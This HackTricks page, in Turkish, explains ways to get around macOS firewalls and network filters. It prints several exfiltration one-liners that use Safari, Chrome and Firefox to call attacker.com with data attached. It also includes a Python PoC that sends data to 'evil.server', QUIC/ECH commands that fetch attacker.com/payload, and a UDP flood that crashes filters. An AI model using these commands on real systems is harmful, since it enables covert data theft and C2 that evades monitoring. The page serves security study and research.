# macOS Güvenlik Duvarlarını Bypass Etme

{{#include ../../banners/hacktricks-training.md}}

## Bulunan teknikler

Aşağıdaki tekniklerin bazı macOS güvenlik duvarı uygulamalarında çalıştığı görüldü.

### Whitelist adlarını kötüye kullanma

- Örneğin malware'i **`launchd`** gibi iyi bilinen macOS işlemlerinin adlarıyla çalıştırmak

### Synthetic Click

- Güvenlik duvarı kullanıcıdan izin isterse malware'in **allow** seçeneğine tıklamasını sağlamak

### **Apple imzalı binary'leri kullanma**

- **`curl`** gibi; ayrıca **`whois`** gibi diğer araçlar da kullanılabilir

### İyi bilinen apple domain'leri

Güvenlik duvarı **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple domain'lerine bağlantılara izin veriyor olabilir. iCloud, C2 olarak kullanılabilir.

### Generic Bypass

Güvenlik duvarlarını bypass etmeyi denemek için bazı fikirler

### İzin verilen trafiği kontrol etme

İzin verilen trafiği bilmek, potansiyel olarak whitelist'e alınmış domain'leri veya bunlara erişmesine izin verilen uygulamaları belirlemenize yardımcı olur
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS Abusing

DNS çözümlemeleri, muhtemelen DNS sunucularıyla iletişim kurmasına izin verilecek olan **`mdnsreponder`** signed application üzerinden gerçekleştirilir.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Browser apps üzerinden

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Process injection ile

**Herhangi bir sunucuya bağlanmasına izin verilen bir prosese code inject edebilirseniz**, firewall korumalarını bypass edebilirsiniz:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Temmuz 2024'te Apple, Screen Time ebeveyn denetimleri tarafından kullanılan sistem genelindeki “Web content filter” özelliğini bozan Safari/WebKit'teki kritik bir bug'ı patch'ledi.
Özel olarak hazırlanmış bir URI (örneğin, çift URL-encoded “://” içeren) Screen Time ACL tarafından tanınmaz ancak WebKit tarafından kabul edilir; bu nedenle request filtrelenmeden gönderilir. Böylece URL açabilen herhangi bir process (sandboxed veya unsigned code dahil), user ya da bir MDM profile tarafından açıkça block'lanan domain'lere ulaşabilir.<sup>[2]</sup>

Pratik test (patch uygulanmamış bir sistemde):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Erken macOS 14 “Sonoma” sürümlerinde Packet Filter (PF) kural sıralama hatası
macOS 14 beta süreci sırasında Apple, **`pfctl`** çevresindeki userspace wrapper'da bir regresyon ortaya çıkardı.
`quick` keyword'üyle eklenen kurallar (birçok VPN kill-switch tarafından kullanılır) sessizce yok sayılıyordu; bu da bir VPN/firewall GUI'si *blocked* raporlasa bile trafik leak'lerine neden oluyordu. Hata birkaç VPN vendor'ı tarafından doğrulandı ve RC 2'de (build 23A344) düzeltildi.

Hızlı leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-imzalı helper servislerini abuse etme (legacy – macOS 11.2 öncesi)
macOS 11.2 öncesinde **`ContentFilterExclusionList`**, **`nsurlsessiond`** ve App Store gibi yaklaşık 50 Apple binary'sinin Network Extension framework ile uygulanan tüm socket-filter firewall'larını bypass etmesine izin veriyordu (LuLu, Little Snitch vb.).
Malware, excluded bir process'i kolayca spawn edebilir veya içine code inject edebilir ve kendi trafiğini zaten izin verilen socket üzerinden tunnel'layabilirdi. Apple, macOS 11.2'de exclusion list'i tamamen kaldırdı, ancak teknik yükseltilemeyen sistemlerde hâlâ geçerlidir.<sup>[3]</sup>

Proof-of-concept örneği (11.2 öncesi):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH ile Network Extension domain filtrelerini atlatma (macOS 12+)
NEFilter Packet/Data Providers, TLS ClientHello SNI/ALPN bilgilerini temel alır. **HTTP/3 over QUIC (UDP/443)** ve **Encrypted Client Hello (ECH)** ile SNI şifreli kalır, NetExt akışı ayrıştıramaz ve hostname kuralları çoğunlukla fail-open çalışarak malware'in DNS'e dokunmadan engellenen domainlere ulaşmasına izin verir.<sup>[5]</sup>

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECH hâlâ etkinse bu, hostname-filter evasion için kolay bir yoldur.

### macOS 15 “Sequoia” Network Extension kararsızlığı (2024–2025)
İlk 15.0/15.1 build’leri, üçüncü taraf **Network Extension** filtrelerinin (LuLu, Little Snitch, Defender, SentinelOne vb.) çökmesine neden olur. Filtre yeniden başlatıldığında macOS flow kurallarını kaldırır ve birçok ürün fail-open durumuna geçer. Filtreyi binlerce kısa UDP flow ile flood’lamak (veya QUIC/ECH’yi zorlamak) çökme olayını tekrar tekrar tetikleyebilir ve GUI hâlâ firewall’un çalıştığını gösterirken C2/exfil için bir pencere bırakabilir.<sup>[4]</sup>

Hızlı reproduction (güvenli lab ortamı):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Modern macOS için araç ipuçları

1. GUI firewalls tarafından oluşturulan mevcut PF kurallarını inceleyin:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Halihazırda *outgoing-network* entitlement'ına sahip binary'leri listeleyin (piggy-backing için kullanışlıdır):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift ile kendi Network Extension content filter'ınızı programatik olarak kaydedin.
Paketleri yerel bir socket'e yönlendiren minimal bir rootless PoC, Patrick Wardle'ın **LuLu** source code'unda mevcuttur.

## Referanslar

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: macOS Firewalls Oluşturma ve Kırma](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass, engellenen içeriğe kısıtlamasız erişime izin veriyor (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple, uygulamaların firewall güvenliğini bypass etmesine izin veren macOS özelliğini kaldırıyor - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [macOS Sequoia Update sonrasında cybersecurity ürünleri çalışmayı durduruyor - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Kötü sitelere macOS bağlantılarını engellemeye yardımcı olmak için network protection kullanın - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
